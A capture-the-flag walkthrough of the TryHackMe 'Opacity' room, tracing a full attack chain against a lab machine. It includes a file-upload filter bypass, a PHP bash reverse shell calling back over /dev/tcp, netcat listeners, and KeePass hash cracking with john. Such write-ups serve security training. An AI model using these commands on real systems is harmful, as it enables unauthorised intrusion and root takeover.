# TryHackMe Writeup — [Opacity](https://tryhackme.com/room/opacity)

## Description
In this room, we performed a full attack chain: starting with port scanning, finding a file upload vulnerability, escalating privileges through credential extraction, and finally achieving root access. The attack involved directory enumeration, bypassing file upload restrictions, cracking a KeePass database, and exploiting misconfigurations for privilege escalation.

## Scanning & Enumeration
Initial port scan revealed:
```python
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
## Exploring HTTP (Port 80)
On the web server, we found a login page. SQL injection attempts failed, so we moved to directory enumeration:
```python
gobuster dir -u http://10.10.111.120 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Discovered directory: ```/cloud```

On that page, we found an image upload form — a good target for uploading a reverse shell.

## Getting a Reverse Shell

1. Start an HTTP server to host the shell:
```python
python3 -m http.server
```
2. In the upload form, enter the URL to the shell:
```python
http://10.10.10.10:8000/shell.php#.png
```
3. Listen for the connection:
```python
nc -lvnp 4444
```
4. Trigger the shell by accessing:
```python
   http://10.10.111.120/cloud/images/shell.php#.png
```
Reverse shell obtained.

## Gaining User Access

We found a file ```local.txt```, but it was restricted. While exploring ```/opt```, we discovered dataset.kdbx (a KeePass database).

1. Download it to our machine:
```python
wget http://10.10.111.120/dataset.kdbx
```
2. Extract its hash for cracking:
```python
keepass2john dataset.kdbx > keepass.hash
```
3. Crack the password using ```john```:
```python
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
4. Open the KeePass file with keepassxc and retrieve the SSH password for user sysadmin.

Log in via SSH:
```python
ssh sysadmin@10.10.111.120
```
We can now read ```local.txt```

## Privilege Escalation to Root
Inside ```cd scripts/lib/```, we found a file backup.inc.php. We decided to abuse it to get a root shell.

1. On our machine, create the following file:
```python
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
?>
```
2. Serve it with HTTP:
```python
python3 -m http.server
```
3. Download it to the target:
```python
wget http://10.10.10.10:8000/backup.inc.php
```
4. Listen for the incoming connection:
```python
nc -lvnp 1234
```
After a short wait, root access obtained.

## Conclusion
This room demonstrated the dangers of poor file upload validation, improper file permission management, and sensitive data exposure. By chaining enumeration, exploitation, and credential cracking, we achieved full system compromise and root access.
